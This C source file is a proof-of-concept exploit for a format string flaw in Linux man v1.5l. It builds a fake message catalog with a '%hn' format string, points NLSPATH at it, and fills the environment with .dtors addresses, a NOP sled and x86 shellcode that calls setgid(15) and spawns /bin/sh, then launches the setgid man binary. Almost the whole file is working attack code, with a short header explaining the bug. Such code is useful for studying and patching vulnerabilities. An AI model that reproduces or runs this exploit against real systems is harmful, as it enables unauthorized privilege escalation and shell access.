/* (linux)man[v1.5l]: format string exploit. *
 *                                           *
 * by: v9@fakehalo.deadpig.org / fakehalo.   *
 *                                           *
 * man v1.5l, and below, contain a format s- *
 * tring vulnerability.  the vulnerability   *
 * occurs when man uses an optional catalog  *
 * file, supplied by the NLSPATH/LANG envir- *
 * onmental variables.                       *
 *                                           *
 * this exploit takes advantage of this vul- *
 * nerability by making a fake catalog.  the *
 * n, changing the 8th catget, which is "Wh- *
 * at manual page do you want?", to "8 %.0d- *
 * &hn%.0d&hn". (0=filled in correctly :))   *
 *                                           *
 * since the environment is the closest user *
 * supplied data reached popping, the explo- *
 * it works like so:                         *
 *                                           *
 * format bug itself: "8 %.0d&hn%.0d&hn",    *
 * ENVVAR=<dtors+2><dtors><nops><shellcode>. *
 * so, the numbers used to write the address *
 * are found in the environment, making the  *
 * environment needing to be well aligned.   *
 *                                           *
 * the bug itself is located here:           *
 * gripes.c:89:vfprintf(stderr,getmsg(n),p); *
 * (getmsg() returns data from the catalog)  *
 *                                           *
 * successful exploitation will look like:   *
 * 000...000000000000000001074078752sh-2.04# *
 *                                           *
 * note: recent glibc versions unsetenv()    *
 * NLSPATH, along with other environmental   *
 * variables, when running set*id programs.  *
 * so, this exploit is limited in that rega- *
 * rd.  this is just a proof of concept any- *
 * ways.                                     *
 *********************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>

#define PATH "/usr/bin/man" /* man binary. */
#define NOP_AMT 4096 /* number of NOPs.    */
#define LANG_NAME "xx" /* "en", "fr", ...  */

static char x86_exec[]= /* with setgid(15); */
 "\xeb\x29\x5e\x31\xc0\xb0\x2e\x31\xdb\xb3"
 "\x0f\xcd\x80\x89\x76\x08\x31\xc0\x88\x46"
 "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
 "\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
 "\x40\xcd\x80\xe8\xd2\xff\xff\xff\x2f\x62"
 "\x69\x6e\x2f\x73\x68\x01";

struct platform {
 unsigned short align;
 unsigned int pops;
 unsigned long dtors_addr;
 unsigned long ret_addr;
 char *exec;
};

struct platform target[2] =
{
 {
  /* alignment.                        */
  0,
  /* pops, example provided below.     */
  88,
  /* objdump -sj.dtors /usr/bin/man    */
  (0x805122c+4),
  /* generalized number, room to work. */
  0xbffffe01,
  /* shellcode, with setgid(15)        */
  x86_exec
 },
 { 0, 0, 0, 0, NULL }
};

char *setfmt(unsigned int);
char *setfmtmem(unsigned int);
char *setlang(unsigned int);
void printe(char *);

int main(int argc,char **argv){
 extern char **environ;

 if(argc<2){
  printf("(*)man[v1.5l]: format string exploit.\n"
  "(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n"
  "syntax: %s <platform>\n"
  " 0 : Compiled RH/linux 2.4.2-2.\n",argv[0]);
  exit(1);
 }
 if(atoi(argv[1])>0)
  printe("main(): invalid platform number");

 /* reset environment to ensure addresses   */
 /* are aligned.  as the pointer used is    */
 /* going to be aligned in the environment. */
 bzero((void *)&environ,sizeof(environ));
 if(!(environ=(char **)malloc(3*(sizeof(char *)))))
  printe("main(): allocation of memory error");

 /* X<alignment>=<addr+2><addr><nops><shellcode> */
 environ[0]=setfmtmem(atoi(argv[1]));

 /* NLSPATH=/path/to/lang. */
 environ[1]=setlang(atoi(argv[1]));
 environ[2]=0x0;

 if(execlp(PATH,PATH,0))
  printe("main(): failed to execute man");

 exit(0);
}
/* makes buffer: "8 %0d$hn%0d$hn" */
char *setfmt(unsigned int pf){
 unsigned int addrl,addrh;
 unsigned int pops=target[pf].pops;
 unsigned long addr=target[pf].ret_addr;
 char *buf;

 addrh=(addr&0xffff0000)>>16;
 addrl=(addr&0x0000ffff);

 if(!(buf=(char *)malloc(64+1)))
  printe("setfmt(): allocating memory failed");
 bzero(buf,(64+1));

 if(addrh<addrl)
  sprintf(buf,"8 %%.%dd%%%d$hn%%.%dd%%%d$hn",
  (addrh-1),pops,(addrl-addrh),(pops+1));
 else
  sprintf(buf,"8 %%.%dd%%%d$hn%%.%dd%%%d$hn",
  (addrl-1),(pops+1),(addrh-addrl),pops);

/* example of how to find amount of pops.  */
/* run the exploit with this return(),     */
/* adding "%x"'s, until you see your data. */
/* return("8 "
 "%x %x %x %x %x %x %x %x %x %x" // 10
 "%x %x %x %x %x %x %x %x %x %x" // 20
 "%x %x %x %x %x %x %x %x %x %x" // 30
 "%x %x %x %x %x %x %x %x %x %x" // 40
 "%x %x %x %x %x %x %x %x %x %x" // 50
 "%x %x %x %x %x %x %x %x %x %x" // 60
 "%x %x %x %x %x %x %x %x %x %x" // 70
 "%x %x %x %x %x %x %x %x %x %x" // 80
 "%x %x %x %x %x %x %x %x" // 8+80=88. (my box)
 "\n"); */

 return(buf);
}
/* makes buffer: <addr+2><addr><nops><shellcode> */
char *setfmtmem(unsigned int pf){
 unsigned short align=target[pf].align;
 unsigned long dtors=target[pf].dtors_addr;
 char filler[][4]={"","X","XX","XXX"};
 char taddr[3];
 char *buf;
 char *exec=target[pf].exec;

 taddr[0]=(dtors&0xff000000)>>24;
 taddr[1]=(dtors&0x00ff0000)>>16;
 taddr[2]=(dtors&0x0000ff00)>>8;
 taddr[3]=(dtors&0x000000ff);

 if(!(buf=(char *)malloc(strlen(exec)+align+
 NOP_AMT+11)))
  printe("getfmtmem(): allocating memory failed");

 bzero(buf,(strlen(exec)+align+NOP_AMT+11));
 sprintf(buf,"X%s=%c%c%c%c%c%c%c%c",
  filler[align],
  taddr[3]+2,taddr[2],taddr[1],taddr[0],
  taddr[3],taddr[2],taddr[1],taddr[0]);

 memset(buf+(10+align),0x90,NOP_AMT);
 memcpy(buf+((10+align+NOP_AMT)-strlen(exec)),
 exec,strlen(exec));

 return(buf);
}
char *setlang(unsigned int pf){
 char *langfile;
 char *langsrc;
 char *execbuf;
 char *envbuf;
 struct passwd *pwd;
 FILE *fs;

 if(!(pwd=getpwuid(getuid())))
  printe("passwd entry doesn't appear to exist");
 else{
  if(strlen(pwd->pw_dir)){
   if(!(langfile=(char *)malloc(strlen((char *)
   pwd->pw_dir)+strlen(LANG_NAME)+7)))
    printe("setlang(): allocating memory failed");
   sprintf(langfile,"%s/mess.%s",(char *)pwd->pw_dir,
   LANG_NAME);
  }
  else
   printe("passwd entry lookup failure");
 }
 if(!(langsrc=(char *)malloc(strlen(langfile)+5)))
  printe("setlang(): allocating memory failed");

 sprintf(langsrc,"%s.src",langfile);

 if(!(fs=fopen(langsrc,"w")))
  printe("setlang(): failed to write to cat file.");
 fs=fopen(langsrc,"w");
 fprintf(fs,"%s\n",setfmt(pf));
 fclose(fs);

 if(!(execbuf=(char *)malloc(strlen(langfile)+
 strlen(langsrc)+9)))
  printe("setlang(): allocating memory failed");
 sprintf(execbuf,"gencat %s %s",langfile,langsrc);

 unlink(langfile);
 system(execbuf);

 if(!(envbuf=(char *)malloc(strlen(langfile)+9)))
  printe("setlang(): allocating memory failed");
 sprintf(envbuf,"NLSPATH=%s",langfile);

 free(langfile);
 free(langsrc);
 free(execbuf);

 return(envbuf);
}
void printe(char *err){
 fprintf(stderr,"error: %s.\n",err);
 exit(0);
}

